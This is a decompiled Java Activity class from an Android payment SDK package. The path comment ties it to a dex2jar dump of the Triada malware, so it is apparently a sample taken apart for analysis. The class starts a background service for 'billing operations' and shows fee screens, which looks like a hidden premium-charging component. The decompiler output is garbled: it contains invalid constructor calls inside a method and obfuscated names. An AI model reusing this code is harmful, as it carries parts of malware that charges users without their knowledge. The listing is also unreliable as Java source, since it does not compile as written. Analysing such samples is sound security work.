package com.android.essdk.eyou;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.View;
import android.widget.FrameLayout;
import com.android.essdk.eyou.b.e;
import com.android.essdk.eyou.e.b;
import com.android.essdk.eyou.e.i;
import com.android.essdk.eyou.ui.FeeView;
import com.android.essdk.eyou.ui.LoadingView;
import java.util.HashMap;

public class EPayActivity extends Activity implements View.OnClickListener {
  public Context a;
  
  private FrameLayout b;
  
  private FeeView c;
  
  private boolean d = false;
  
  private Handler e = new a(this);
  
  private LoadingView f;
  
  private int g;
  
  private void a() {
    try {
      HashMap hashMap = (HashMap)getIntent().getSerializableExtra("map");
      Thread thread = new Thread();
      b b = new b();
      this(this, hashMap);
      this(b);
      thread.start();
    } catch (Exception exception) {
      b.e("epay_log", "map is null? or map is not HashMap?");
    } 
  }
  
  private void b() {
    this.b.removeAllViews();
    this.f = new LoadingView((Context)this);
    this.f.a("准备中...");
    this.b.addView((View)this.f);
  }
  
  private void c() {
    this.b.invalidate();
    i.c((Context)this);
    d();
  }
  
  private void d() {
    this.c.a();
    this.c.setVisibility(0);
    this.b.invalidate();
  }
  
  private void e() {
    this.b.removeAllViews();
    this.c = new FeeView((Context)this, null);
    this.c.setVisibility(8);
    this.c.a(new c(this));
    this.b.addView((View)this.c);
  }
  
  private void f() {
    b.b("EPayActivty", "开启后台service进行计费操作");
    startService(new Intent((Context)this, PlateService.class));
    this.d = true;
    d.a().a((Context)this);
    if (this.g == 1) {
      g();
      return;
    } 
    this.b.removeAllViews();
    this.b.addView((View)this.f);
  }
  
  private void g() {
    b.b("EPayActivty", "关闭界面");
    if (!this.d) {
      b.b("EPayActivty", "未计费，付费结果写入sharedPreferences中！");
      e.a().e((Context)this, 102);
    } 
    finish();
  }
  
  public void onClick(View paramView) {}
  
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    requestWindowFeature(1);
    this.a = (Context)this;
    this.b = new FrameLayout((Context)this);
    setContentView((View)this.b);
    this.g = getIntent().getIntExtra("enterType", 0);
    if (this.g == 1) {
      e();
      c();
      return;
    } 
    b();
    a();
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent) {
    if (paramInt == 4) {
      b.b("EPayActivty", "是否正在计费中？" + this.d);
      if (!this.d)
        d.a().a((Context)this); 
      g();
    } 
    return super.onKeyDown(paramInt, paramKeyEvent);
  }
  
  public boolean onKeyUp(int paramInt, KeyEvent paramKeyEvent) {
    return super.onKeyUp(paramInt, paramKeyEvent);
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/EPayActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */